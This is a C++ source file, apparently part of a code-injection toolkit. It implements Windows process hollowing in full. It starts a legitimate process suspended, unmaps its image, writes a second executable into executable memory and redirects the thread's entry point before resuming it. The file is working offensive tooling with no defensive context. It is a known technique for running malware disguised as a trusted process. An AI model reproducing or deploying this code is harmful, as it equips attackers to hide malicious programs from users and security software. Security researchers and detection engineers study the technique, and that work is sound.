#include <cstdio>
#include <string>

#include "common.h"
#include "sysapi.h"
#include "unique_memory.h"


namespace scripts {

bool inject_create_process_hollowed(const std::wstring& original_image, const std::wstring& injected_image) {

    wprintf(L"Creating process...\n");

    auto process = sysapi::ProcessCreate(original_image, true);
    if (process.hProcess == NULL) {
        return false;
    }

    auto *PEBAddress = sysapi::ProcessGetPEBAddress(process.hProcess.get());
    if (PEBAddress == nullptr) {
        return false;
    }

    unique_c_mem<PEB> process_peb;
    if (!process_peb.allocate()) {
        return false;
    }

    size_t read = sysapi::VirtualMemoryRead(process_peb.data(), sizeof(PEB), PEBAddress, process.hProcess.get());
    if (read == 0) {
        return false;
    }

    wprintf(L"Unmapping process section...\n");

    bool res = sysapi::SectionUnmapView(process_peb->ImageBaseAddress, process.hProcess.get());
    if (!res) {
        return false;
    }

    wprintf(L"Opening process image...\n");

    sysapi::unique_handle hFile = sysapi::FileOpen(injected_image.c_str());
    if (hFile == NULL)
    {
        return false;
    }

    size_t FileSize = sysapi::FileGetSize(hFile.get());
    if (FileSize == NULL)
    {
        return false;
    }

    auto ImageFileSection = sysapi::SectionFileCreate(hFile.get());
    if (ImageFileSection == NULL)
    {
        return false;
    }

    // TODO: RAII
    auto* ImageFileBuffer = sysapi::SectionMapView(ImageFileSection, FileSize, PAGE_READONLY);
    if (ImageFileBuffer == NULL)
    {
        return false;
    }

    auto* pDOSHeader = (PIMAGE_DOS_HEADER)ImageFileBuffer;

    auto* pNT32Header = (PIMAGE_NT_HEADERS32)PTR_ADD(ImageFileBuffer, pDOSHeader->e_lfanew);
    auto* pNT64Header = (PIMAGE_NT_HEADERS64)pNT32Header;

    bool is_64 = pNT32Header->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;

    wprintf(L"Allocating memory for new image...\n");

    process_peb->ImageBaseAddress = sysapi::VirtualMemoryAllocate(pNT32Header->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, process.hProcess.get(), process_peb->ImageBaseAddress);
    if (process_peb->ImageBaseAddress == nullptr) {
        return false;
    }

    wprintf(L"Writing image headers...\n");

    res = sysapi::VirtualMemoryWrite(ImageFileBuffer, pNT32Header->OptionalHeader.SizeOfHeaders, process_peb->ImageBaseAddress, process.hProcess.get());
    if (!res) {
        return false;
    }

    auto* pSections = (PIMAGE_SECTION_HEADER)PTR_ADD(ImageFileBuffer, pDOSHeader->e_lfanew + (is_64 ? sizeof(IMAGE_NT_HEADERS64) : sizeof(IMAGE_NT_HEADERS32)));

    for (ULONG i = 0; i < pNT32Header->FileHeader.NumberOfSections; i++) {

        if (!pSections[i].PointerToRawData) {
            continue;
        }

        auto pSectionDestination = PTR_ADD(process_peb->ImageBaseAddress, pSections[i].VirtualAddress);

        wprintf(L"Writing %hs section to 0x%p...\n", (char*)pSections[i].Name, pSectionDestination);

        res = sysapi::VirtualMemoryWrite(PTR_ADD(ImageFileBuffer, pSections[i].PointerToRawData), pSections[i].SizeOfRawData, pSectionDestination, process.hProcess.get());
        if (!res) {
            return false;
        }
    }

    wprintf(L"Relocating image...\n");

    res = sysapi::PeImageRelocate(ImageFileBuffer, process_peb->ImageBaseAddress, process.hProcess.get());
    if (!res) {
        return false;
    }

    if (is_64) {

        unique_c_mem<CONTEXT> context;
        if (!context.allocate()) {
            return false;
        }

        memset(context.data(), 0, sizeof(CONTEXT));

        context->ContextFlags = CONTEXT_FULL;

        wprintf(L"Getting thread context...\n");

        res = sysapi::ThreadGetContext(process.hThread.get(), context.data());
        if (!res) {
            return false;
        }

        context->Rcx = (DWORD64)(UINT_PTR)PTR_ADD(process_peb->ImageBaseAddress, pNT64Header->OptionalHeader.AddressOfEntryPoint);

        wprintf(L"Setting thread context..\n");

        res = sysapi::ThreadSetContext(process.hThread.get(), context.data());
        if (!res) {
            return false;
        }
    }
    else
    {
        unique_c_mem<WOW64_CONTEXT> context;
        if (!context.allocate()) {
            return false;
        }

        memset(context.data(), 0, sizeof(WOW64_CONTEXT));

        context->ContextFlags = CONTEXT_FULL;

        wprintf(L"Getting thread context...\n");

        res = sysapi::ThreadGetWow64Context(process.hThread.get(), context.data());
        if (!res) {
            return false;
        }

        context->Eax = (DWORD)(UINT_PTR)PTR_ADD(process_peb->ImageBaseAddress, pNT32Header->OptionalHeader.AddressOfEntryPoint);

        wprintf(L"Setting thread context...\n");

        res = sysapi::ThreadSetWow64Context(process.hThread.get(), context.data());
        if (!res) {
            return false;
        }
    }

    wprintf(L"Resuming thread...\n");

    if (!ResumeThread(process.hThread.get())) {
        return false;
    }

    wprintf(L"Process hollowing complete\n");
    return true;
}

}
